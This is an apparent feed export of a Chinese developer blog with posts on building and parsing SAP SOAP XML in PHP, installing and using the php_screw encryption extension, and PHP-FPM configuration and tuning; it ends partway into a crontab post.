      <content type="html"><![CDATA[<p>项目中会遇到xml接口对接</p><h3 id="xml请求"><a href="#xml请求" class="headerlink" title="xml请求"></a>xml请求</h3><ul><li>xml参数封装</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//表单</span><br><span class="line"><span class="variable">$item</span> .=<span class="string">'&lt;item&gt;</span></span><br><span class="line"><span class="string">&lt;BUKRS&gt;'</span>.<span class="variable">$v</span>[<span class="string">'bukrs'</span>].<span class="string">'&lt;/BUKRS&gt;</span></span><br><span class="line"><span class="string">&lt;WERKS&gt;'</span>.<span class="variable">$v</span>[<span class="string">'shop_id'</span>].<span class="string">'&lt;/WERKS&gt;</span></span><br><span class="line"><span class="string">&lt;RECNNR&gt;'</span>.<span class="variable">$v</span>[<span class="string">'recnnr'</span>].<span class="string">'&lt;/RECNNR&gt;</span></span><br><span class="line"><span class="string">&lt;CONDTYPE&gt;'</span>.<span class="variable">$zk_conds</span>.<span class="string">'&lt;/CONDTYPE&gt;</span></span><br><span class="line"><span class="string">&lt;UNITPRICE&gt;'</span>.abs(<span class="variable">$amount</span>).<span class="string">'&lt;/UNITPRICE&gt;</span></span><br><span class="line"><span class="string">&lt;BEGDA&gt;'</span>.<span class="variable">$getData</span>[<span class="string">'time'</span>].<span class="string">'&lt;/BEGDA&gt;</span></span><br><span class="line"><span class="string">&lt;ENDDA&gt;'</span>.<span class="variable">$getData</span>[<span class="string">'time'</span>].<span class="string">'&lt;/ENDDA&gt;</span></span><br><span class="line"><span class="string">&lt;ZPYMTMETH&gt;&lt;/ZPYMTMETH&gt;</span></span><br><span class="line"><span class="string">&lt;REMARK&gt;'</span>.<span class="variable">$v</span>[<span class="string">'remark'</span>].<span class="string">'&lt;/REMARK&gt;</span></span><br><span class="line"><span class="string">&lt;/item&gt;'</span> ;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">//表头</span><br><span class="line"><span class="variable">$resques</span> =  </span><br><span class="line"><span class="string">'&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:sap-com:document:sap:rfc:functions"&gt;</span></span><br><span class="line"><span class="string">&lt;soapenv:Header/&gt;</span></span><br><span class="line"><span class="string">&lt;soapenv:Body&gt;</span></span><br><span class="line"><span class="string">&lt;urn:ZTRE_DEDUCT_CREATE&gt;</span></span><br><span class="line"><span class="string">&lt;!--Optional:--&gt;</span></span><br><span class="line"><span class="string">&lt;BUKRS&gt;'</span>.array_unique(array_column(<span class="variable">$data</span>, <span class="string">'bukrs'</span>))[0].<span class="string">'&lt;/BUKRS&gt;</span></span><br><span class="line"><span class="string">&lt;!--Optional:--&gt;</span></span><br><span class="line"><span class="string">&lt;WERKS&gt;'</span>.array_unique(array_column(<span class="variable">$data</span>, <span class="string">'shop_id'</span>))[0].<span class="string">'&lt;/WERKS&gt;</span></span><br><span class="line"><span class="string">&lt;!--Optional:--&gt;</span></span><br><span class="line"><span class="string">&lt;REMARK&gt;'</span>.<span class="variable">$getData</span>[<span class="string">'remark'</span>].<span class="string">'&lt;/REMARK&gt;</span></span><br><span class="line"><span class="string">&lt;!--Optional:--&gt;</span></span><br><span class="line"><span class="string">&lt;CRTUSR&gt;'</span>.<span class="variable">$getData</span>[<span class="string">'job_no'</span>].<span class="string">'&lt;/CRTUSR&gt;</span></span><br><span class="line"><span class="string">&lt;!--Optional:--&gt;</span></span><br><span class="line"><span class="string">&lt;ITAB&gt;</span></span><br><span class="line"><span class="string">&lt;!--Zero or more repetitions:--&gt;'</span></span><br><span class="line">    .<span class="variable">$item</span>.</span><br><span class="line">    <span class="string">'</span></span><br><span class="line"><span class="string">    &lt;/ITAB&gt;</span></span><br><span class="line"><span class="string">&lt;/urn:ZTRE_DEDUCT_CREATE&gt;</span></span><br><span class="line"><span class="string">&lt;/soapenv:Body&gt;</span></span><br><span class="line"><span class="string">&lt;/soapenv:Envelope&gt;'</span>;</span><br></pre></td></tr></table></figure><ul><li>参数请求</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 请求接口</span><br><span class="line"> *</span><br><span class="line"> * @param  string <span class="variable">$xml</span>  xml参数</span><br><span class="line"> * @param  string <span class="variable">$url</span>  接口地址</span><br><span class="line"> * @param  string <span class="variable">$action</span> uri</span><br><span class="line"> * @param  string <span class="variable">$account</span>  账号</span><br><span class="line"> * @param  string <span class="variable">$password</span> 密码</span><br><span class="line"> * @<span class="built_in">return</span> [<span class="built_in">type</span>][description]</span><br><span class="line"> */</span><br><span class="line">public <span class="keyword">function</span> doSapXmlData(<span class="variable">$xml</span>,<span class="variable">$url</span>,<span class="variable">$action</span>,<span class="variable">$account</span>=<span class="string">''</span>,<span class="variable">$password</span>=<span class="string">''</span>)&#123;</span><br><span class="line"><span class="variable">$account</span> = !<span class="variable">$account</span>?<span class="variable">$this</span>-&gt;account:<span class="variable">$account</span>;</span><br><span class="line"><span class="variable">$password</span> = !<span class="variable">$password</span>?<span class="variable">$this</span>-&gt;password:<span class="variable">$password</span>;</span><br><span class="line">//获取soap对象</span><br><span class="line"><span class="variable">$obj</span> = new \SoapClient(null,array(</span><br><span class="line"><span class="string">'location'</span> =&gt;<span class="variable">$url</span>,</span><br><span class="line"><span class="string">'uri'</span> =&gt;<span class="variable">$url</span>,</span><br><span class="line"><span class="string">'login'</span>=&gt; <span class="variable">$account</span>,</span><br><span class="line"><span class="string">'password'</span>=&gt; <span class="variable">$password</span>));</span><br><span class="line">//发送请求</span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$obj</span>-&gt;__doRequest(<span class="variable">$xml</span>,config(<span class="string">'sapPosData.action_data'</span>),config(<span class="string">'sapPosData.version'</span>),1,0);</span><br><span class="line">// writeLog(<span class="variable">$data</span>,Config(<span class="string">'LOG_PATH'</span>).<span class="string">'async/'</span>,<span class="string">'xml_request'</span>);</span><br><span class="line"><span class="built_in">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>请求完成后返回参数应该是个对象</p><h3 id="处理返回结果"><a href="#处理返回结果" class="headerlink" title="处理返回结果"></a>处理返回结果</h3><ul><li>解析表头</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$domDocument</span> = new \DOMDocument;</span><br><span class="line"><span class="variable">$domDocument</span>-&gt;loadXML(<span class="variable">$resquesData</span>);</span><br><span class="line"><span class="variable">$xml_node</span> = <span class="variable">$domDocument</span>-&gt;getElementsByTagName(<span class="string">"ZTRE_DEDUCT_CREATEResponse"</span>)-&gt;item(0);</span><br><span class="line">foreach (<span class="variable">$xml_node</span>-&gt;childNodes as <span class="variable">$kk</span> =&gt; <span class="variable">$vv</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$vv</span>-&gt;nodeName==<span class="string">'ITAB'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$vv</span>-&gt;childNodes-&gt;length&gt;0)&#123;</span><br><span class="line">            foreach(<span class="variable">$vv</span>-&gt;childNodes as <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$v</span>-&gt;childNodes-&gt;length&gt;0)&#123;</span><br><span class="line">                    foreach (<span class="variable">$v</span>-&gt;childNodes as <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                        <span class="variable">$resp</span>[<span class="variable">$vv</span>-&gt;nodeName][<span class="variable">$k</span>][<span class="variable">$value</span>-&gt;nodeName] = <span class="variable">$value</span>-&gt;nodeValue;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$resp</span>[<span class="variable">$vv</span>-&gt;nodeName] = <span class="variable">$vv</span>-&gt;nodeValue;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$resp</span>[<span class="variable">$vv</span>-&gt;nodeName] = <span class="variable">$vv</span>-&gt;nodeValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$resp</span>[<span class="variable">$vv</span>-&gt;nodeName] = <span class="variable">$vv</span>-&gt;nodeValue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (empty(<span class="variable">$resp</span>)) throw new \Exception(<span class="string">"请求异常"</span>, 1);</span><br></pre></td></tr></table></figure><ul><li>解析表单</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$xml_obj</span> = simplexml_load_string(<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$resp</span> = json_decode(json_encode(<span class="variable">$xml_obj</span>-&gt;xpath(<span class="string">"//ITAB/item"</span>)),<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>结果就是$resp;</p>]]></content>
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> xml </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>php_screw安装和使用</title>
      <link href="/php_screw.html"/>
      <url>/php_screw.html</url>
      <content type="html"><![CDATA[<p>php_screw 是一个 PHP 源代码加密扩展。</p><h3 id="安装和编译"><a href="#安装和编译" class="headerlink" title="安装和编译"></a>安装和编译</h3><ul><li>下载</li></ul><p>官网下载：<a href="https://sourceforge.net/projects/php-screw/" target="_blank" rel="noopener">phpscrew-1.5 </a></p><ul><li>安装</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget https://sourceforge.net/projects/php-screw/files/php-screw/1.5/php_screw-1.5.tar.gz/download</span><br><span class="line">tar -zxvf php_screw-1.5.tar.gz </span><br><span class="line"><span class="built_in">cd</span> php_screw-1.5</span><br><span class="line">/usr/<span class="built_in">local</span>/php/bin/phpize</span><br><span class="line">./configure --with-php-config=/usr/<span class="built_in">local</span>/php/bin/php-config</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>执行正常后<br>在./modules/和/usr/local/php/lib/php/extensions/no-debug-non-zts-20100525下生成php_screw.so文件<br>执行make intall命令如果出现 ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/include/php/ext/date/lib -DHAVE_CONFIG_H -g -O2 -c /home/developer/php_screw-1.5/php_screw.c  -fPIC -DPIC -o .libs/php_screw.o</span><br><span class="line">/home/developer/php_screw-1.5/php_screw.c: 在函数‘zm_startup_php_screw’中:</span><br><span class="line">/home/developer/php_screw-1.5/php_screw.c:124: 错误：‘struct _zend_compiler_globals’没有名为‘extended_info’的成员</span><br><span class="line">/home/developer/php_screw-1.5/php_screw.c: 在函数‘zm_shutdown_php_screw’中:</span><br><span class="line">/home/developer/php_screw-1.5/php_screw.c:133: 错误：‘struct _zend_compiler_globals’没有名为‘extended_info’的成员</span><br><span class="line">make: *** [php_screw.lo] 错误 1</span><br></pre></td></tr></table></figure><p>这些信息时：需要修改/home/developer/php_screw-1.5/php_screw.c,下载文件路径因人而异<br>将  124行,133行 的 CG(extended_info) = 1;修改为：CG(compiler_options) |= ZEND_COMPILE_EXTENDED_INFO;<br>再执行make &amp;&amp; make install</p><ul><li>修改php.ini，加入扩展</li></ul><p>php.ini:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extension=php_screw.so</span><br></pre></td></tr></table></figure></p><p>重启php-fpm</p><ul><li>生成加密命令</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/developer/php_screw-1.5/tools</span><br><span class="line"><span class="comment">#make后会生产 screw命令</span></span><br><span class="line">make</span><br><span class="line"><span class="comment">#测试加密test.php</span></span><br><span class="line">php_screw-1.5/tools/screw test.php</span><br><span class="line"><span class="comment">#执行后输出：</span></span><br><span class="line">Success Crypting(test.php)</span><br><span class="line"><span class="comment">#添加到全局命令</span></span><br><span class="line">cp screw /usr/bin/</span><br></pre></td></tr></table></figure><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>在上面生成了 screw全局命令后</p><p>1.整个目录下的文件加密需要用如下命令： 支持子目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#加密当前目录下php文件</span></span><br><span class="line">find ./ -name <span class="string">"*.php"</span> -<span class="built_in">print</span>|xargs -n1 screw</span><br><span class="line"><span class="comment">#删除加密生产备份文件</span></span><br><span class="line">find ./ -name <span class="string">"*.screw"</span> -<span class="built_in">print</span>|xargs -n1 rm</span><br></pre></td></tr></table></figure><p>2.单个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screw a.php</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> linux </tag>
            
            <tag> php_screw </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>php-fpm解说</title>
      <link href="/php-fpm.html"/>
      <url>/php-fpm.html</url>
      <content type="html"><![CDATA[<p>PHP-FPM配置及使用总结：</p><p>PHP-FPM是一个PHP FastCGI的管理器，它实际上就是PHP源代码的补丁，旨在将FastCGI进程管理引进到PHP软件包中，我们必须将其patch到PHP源代码中，然后再行编译才能使用。而现在我们可以在PHP 5.3.2及更新版本中直接开启并使用即可，因为PHP从该版本已经将其收入到软件包中，所以其不再是补丁包的存在了。</p><h3 id="几个概念的理解"><a href="#几个概念的理解" class="headerlink" title="几个概念的理解"></a>几个概念的理解</h3><ul><li>CGI</li></ul><p>CGI全称“公共网关接口”(Common Gateway Interface)，是HTTP服务器与其它机器上的程序进行通信的接口，其程序须运行在网络服务器上。<br>NOTE:CGI可以用任何一种语言编写，只要这种语言具有标准输入、输出和环境变量。</p><ul><li>FastCGI</li></ul><p>1.FastCGI是一个常驻型的CGI，它可以一直执行，只要激活后，不会每次都要花费时间去fork一次（这是CGI最为人诟病的fork-and-execute模式）。它还支持分布式的运算，即 FastCGI 程序可以在网站服务器以外的主机上执行并且接受来自其它网站服务器来的请求。<br>2.FastCGI是语言无关的、可伸缩架构的CGI开放扩展，其主要行为是将CGI解释器进程保持在内存中并因此获得较高的性能。我们知道，CGI解释器的反复加载是CGI性能低下的主要原因，如果CGI解释器保存在内存中并接受FastCGI进程管理器调度，那么就可以提供良好的性能、伸缩性等。</p><p>优点：<br>1.FastCGI具有语言无关性；<br>2.FastCGI独立于核心web服务器运行，提供了一个比API更安全的环境。APIs把应用程序的代码与核心的web服务器链接在一起，这意味着在一个错误的API的应用程序可能会损坏其他应用程序或核心服务器。而恶意的API的应用程序代码甚至可以窃取另一个应用程序或核心服务器的密钥；<br>3.FastCGI技术目前支持语言有：C/C++、Java、Perl、Tcl、Python、SmallTalk、Ruby等。相关模块在Apache, ISS, Lighttpd等流行的服务器上也是可用的；<br>4.FastCGI不依赖于任何Web服务器的内部架构，因此即使服务器技术的变化, FastCGI依然稳定不变；</p><p>缺点：<br>因为是多进程，所以比CGI多线程消耗更多的服务器内存，PHP-CGI解释器每进程消耗7至25兆内存，将这个数字乘以50或100就是很大的内存数。<br>Nginx 0.8.46+PHP 5.2.14(FastCGI)服务器在3万并发连接下，开启的10个Nginx进程消耗150M内存（15M<em>10=150M），开启的64个php-cgi进程消耗1280M内存（20M</em>64=1280M），加上系统自身消耗的内存，总共消耗不到2GB内存。如果服务器内存较小，完全可以只开启25个php-cgi进程，这样php-cgi消耗的总内存数才500M。<br>上面的数据摘自Nginx 0.8.x + PHP 5.2.13(FastCGI)搭建胜过Apache十倍的Web服务器(第6版)。</p><p>原理：<br>1.Web服务器启动时，载入FastCGI进程管理器；<br>2.FastCGI进程管理器初始化，启动多个CGI解释器进程(PHP-CGI)并等待来自Web服务器的连接；<br>3.当客户端请求到达Web服务器时，FastCGI进程管理器选择并连接到一个CGI解释器，Web服务器将CGI环境变量和标准输入发送到FastCGI子进程PHP-CGI。<br>4.FastCGI子进程完成处理后将标准输出和错误信息从同一连接返回给Web服务器。当FastCGI子进程关闭连接时，请求便告处理完成。FastCGI子进程接着等待并处理来自FastCGI进程管理器(运行在Web服务器中)的下一个连接。而在CGI模式中，PHP-CGI在此便退出了。</p><p>在上述情况中，可以想象CGI通常有多慢，每一个Web请求PHP都必须重新解析php.ini、重新载入全部扩展，并重初始化全部数据结构。而使用FastCGI，所有这些都只在进程启动时发生一次。另外，数据库持久连接可以工作。</p><p>NOTE:FastCGI的主要优点是把动态语言和HTTP Server分离开来，所以Nginx与PHP/PHP-FPM经常被部署在不同的服务器上，以分担前端Nginx服务器的压力，使Nginx专一处理静态请求和转发动态请求，而PHP/PHP-FPM服务器专一解析PHP动态请求。</p><ul><li>PHP-CGI</li></ul><p>PHP-CGI是PHP自带的FastCGI管理器。<br>缺点：<br>1.php-cgi变更php.ini配置后需重启php-cgi才能让新的php-ini生效，不可以平滑重启。<br>2.直接杀死php-cgi进程，php就不能运行了(PHP-FPM和Spawn-FCGI就没有这个问题，守护进程会平滑重新生成新的子进程)。</p><ul><li>Spawn-FCGI</li></ul><p>Spawn-FCGI是一个通用的FastCGI管理服务器，它是lighttpd中的一部份，很多人都用Lighttpd的Spawn-FCGI进行FastCGI模式下的管理工作，不过有不少缺点。而PHP-FPM的出现多少缓解了一些问题，但PHP-FPM有个缺点就是要重新编译，这对于一些已经运行的环境可能有不小的风险(refer)，在php 5.3.3可以直接使用PHP-FPM了。</p><p>Spawn-FCGI目前已经独成为一个项目，更加稳定一些，也给很多Web 站点的配置带来便利。已经有不少站点将它与nginx搭配来解决动态网页。最新的lighttpd也没有包含这一块了<a href="http://www.lighttpd.net/search?q=Spawn-FCGI" target="_blank" rel="noopener">lighttpd</a>，但可以在以前版本中找到它。在lighttpd-1.4.15</p><p>版本中就包含了<a href="http://www.lighttpd.net/download/lighttpd-1.4.15.tar.gz" target="_blank" rel="noopener">lighttpd-1.4.15 down</a>，目前Spawn-FCGI的下载地址是<a href="http://www.lighttpd.net/download/spawn-fcgi-1.6.3.tar.gz" target="_blank" rel="noopener">spawn-fcgi-1.6.3</a>。</p><p>NOTE：最新的Spawn-FCGI可以到lighttpd.net网站搜索“Spawn-FCGI”找到它的最新版本发布地址。</p><p>对比Spawn-FCGI:<br>1.PHP-FPM的使用非常方便，配置都是在PHP-FPM.ini的文件内，而启动、重启都可以从php/sbin/PHP-FPM中进行。更方便的是修改php.ini后可以直接使用PHP-FPM reload进行加载，无需杀掉进程就可以完成php.ini的修改加载<br>2.结果显示使用PHP-FPM可以使php有不小的性能提升。PHP-FPM控制的进程cpu回收的速度比较慢,内存分配的很均匀。<br>3.Spawn-FCGI控制的进程CPU下降的很快，而内存分配的比较不均匀。有很多进程似乎未分配到，而另外一些却占用很高。可能是由于进程任务分配的不均匀导致的。而这也导致了总体响应速度的下降。而PHP-FPM合理的分配，导致总体响应的提到以及任务的平均。</p><h3 id="Nginx-PHP配置"><a href="#Nginx-PHP配置" class="headerlink" title="Nginx+PHP配置"></a>Nginx+PHP配置</h3><ul><li>进程数优化</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pm = dynamic</span><br><span class="line">pm.max_children = 300</span><br><span class="line">pm.start_servers = 20</span><br><span class="line">pm.min_spare_servers = 5</span><br><span class="line">pm.max_spare_servers = 35</span><br></pre></td></tr></table></figure><ul><li>最大请求数优化</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pm.max_requests = 10240</span><br></pre></td></tr></table></figure><p>NOTE:这个用来处理因为PHP解析器或引用的第三方库时，造成的内存泄露问题。<br>最大请求数：指一个php-fpm的工作进程在处理多少个请求后就终止掉。</p><ul><li>最长执行时间优化（php.ini）</li></ul><pre><code class="bash">request_terminate_timeout = 20</code></pre><p>NOTE:<br>这个是用来处理因为PHP执行时间超长而报502错误的解决。<br>这个时长配置可以在php.ini（max_execution_time）或php-fpm.conf中配置均可，为了不影响全局配置，可在php-fpm.conf中实现。<br>值得注意的是：需要结合nginx.conf中的max_fail（调大些）和fail_timeout（调小些）一同配置。</p><p>nginx.conf:</p><pre><code class="bash">location ~ \.php$ {…fastcgi_connect_timeout      180;fastcgi_read_timeout      600;fastcgi_send_timeout       600;…}</code></pre><p>NOTE:<br>PHP-FPM设置的脚本最大执行时间已经够长了，但执行耗时PHP脚本时，发现Nginx报错变为504错误。这是因为我们修改的只是PHP的配置，Nginx中也有关于与上游服务器通信超时时间的配置factcgi_connect/read/send_timeout。</p><ul><li>php-fpm高cpu使用排查</li></ul><p>top命令 :<br>直接执行top命令后，输入1就可以看到各个核心的CPU使用率:</p><p>sar命令：<br>sar和iostat命令的安装：</p><pre><code class="bash">sysstat.x86_64 : The sar and iostat systemmonitoring commandsyum install -y sysstat.x86_64</code></pre><p>执行：</p><pre><code class="bash"><span class="variable">$sar</span> -P ALL 1 100</code></pre><p>NOTE:<br>-P ALL表示监控所有核心;<br>1表示每1秒采集;<br>100表示采集100次;</p><ul><li>开启慢日志</li></ul><pre><code class="bash">slowlog = <span class="built_in">log</span>/<span class="variable">$pool</span>.log.slowrequest_slowlog_timeout = 2</code></pre><p>NOTE:<br>上面为开启php-fpm的慢日志，时间阀值2秒；</p><p>执行：</p><pre><code class="bash">grep -v <span class="string">"^$"</span> php.slow.log | cut -d <span class="string">" "</span> -f 3,2 | sort |uniq -c | sort -k1,1nr | head -n 50</code></pre><p>NOTE:<br> sort: 对单词进行排序</p><pre><code class="bash">uniq -c:  显示唯一的行，并在每行行首加上本行在文件中出现的次数sort -k1,1nr:  按照第一个字段，数值排序，且为逆序head –n 10:  取前10行数据</code></pre><p>PS:<br>开启慢日志的目的是为了跟踪分析那条php脚本执行的时间超过了设置的request_slowlog_timeout时长，如果超过这个设置时间，那么该脚本就会被记录下。</p><h3 id="Php-Fpm的操作"><a href="#Php-Fpm的操作" class="headerlink" title="Php-Fpm的操作"></a>Php-Fpm的操作</h3><p>PHP5.3.3下的php-fpm 不再支持php-fpm 以前具有的 /usr/local/php/sbin/php-fpm(start|stop|reload)等命令，需要使用信号控制：<br>master进程可以理解以下信号<br>INT, TERM 立刻终止;<br>QUIT 平滑终止;<br>USR1 重新打开日志文件;<br>USR2平滑重载所有worker进程并重新载入配置和二进制模块 ;</p><p>查看php-fpm进程数：</p><pre><code class="bash">ps aux | grep -c php-fpm</code></pre>]]></content>
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> linux </tag>
            
            <tag> php-fpm </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>crontab 定时任务</title>
      <link href="/crontab.html"/>
      <url>/crontab.html</url>
      <content type="html"><![CDATA[<p>php计划任务管理实现</p><ul><li>主程序</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span 